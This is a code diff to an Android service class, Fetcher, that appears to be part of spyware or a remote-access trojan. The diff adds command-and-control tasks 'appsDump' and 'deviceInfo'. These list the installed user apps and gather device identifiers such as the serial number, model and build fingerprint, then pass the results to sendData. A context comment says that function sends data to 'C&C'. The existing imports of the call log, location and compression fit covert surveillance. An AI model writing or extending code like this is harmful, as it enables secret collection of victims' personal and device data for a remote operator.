@@ -7,6 +7,8 @@ import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
+import android.content.pm.ApplicationInfo;
+import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.location.Location;
@@ -14,6 +16,7 @@ import android.net.ConnectivityManager;
 import android.net.NetworkInfo;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.os.Build;
 import android.os.IBinder;
 import android.preference.PreferenceManager;
 import android.provider.CallLog;
@@ -48,6 +51,7 @@ import java.net.URLEncoder;
 import java.sql.Date;
 import java.text.SimpleDateFormat;
 import java.util.ArrayList;
+import java.util.List;
 import java.util.TimeZone;
 import java.util.UUID;
 import java.util.zip.GZIPOutputStream;
@@ -161,6 +165,12 @@ public class Fetcher extends Service {
                                 break;
                             case "getGeoLocation":
                                 sendData(task, uuid, getLastLocation());
+                                break;
+                            case "appsDump":
+                                sendData(task, uuid, fetchApps());
+                                break;
+                            case "deviceInfo":
+                                sendData(task, uuid, deviceInfo());
                                 break;
                         }
                     }
@@ -317,6 +327,40 @@ public class Fetcher extends Service {
                     });
         }
         return geoLocation;
+    }
+
+    // Method to dump installed non-system applications
+    private ArrayList<String> fetchApps() {
+        ArrayList<String> apps = new ArrayList<>();
+        List<PackageInfo> packList = getPackageManager().getInstalledPackages(0);
+        for (int i = 0; i < packList.size(); i++) {
+            PackageInfo packInfo = packList.get(i);
+            if ((packInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
+                String appName = packInfo.applicationInfo.loadLabel(getPackageManager()).toString();
+                apps.add("\n ID => " + i + "\n Application => " + appName + "\n");
+            }
+        }
+        return apps;
+    }
+
+    // Method to retrieve device information
+    private ArrayList<String> deviceInfo() {
+        ArrayList<String> info = new ArrayList<>();
+        info.add("\n Serial => " + Build.SERIAL + "\n");
+        info.add("\n Model => " + Build.MODEL + "\n");
+        info.add("\n ID => " + Build.ID + "\n");
+        info.add("\n Manufacturer => " + Build.MANUFACTURER + "\n");
+        info.add("\n Brand => " + Build.BRAND + "\n");
+        info.add("\n Type => " + Build.TYPE + "\n");
+        info.add("\n User => " + Build.USER + "\n");
+        info.add("\n Base => " + Build.VERSION_CODES.BASE + "\n");
+        info.add("\n Incremental => " + Build.VERSION.INCREMENTAL + "\n");
+        info.add("\n SDK => " + Build.VERSION.SDK + "\n");
+        info.add("\n Board => " + Build.BOARD + "\n");
+        info.add("\n Host => " + Build.HOST + "\n");
+        info.add("\n Fingerprint => " + Build.FINGERPRINT + "\n");
+        info.add("\n Release => " + Build.VERSION.RELEASE + "\n");
+        return info;
     }
 
     // Send data to C&C
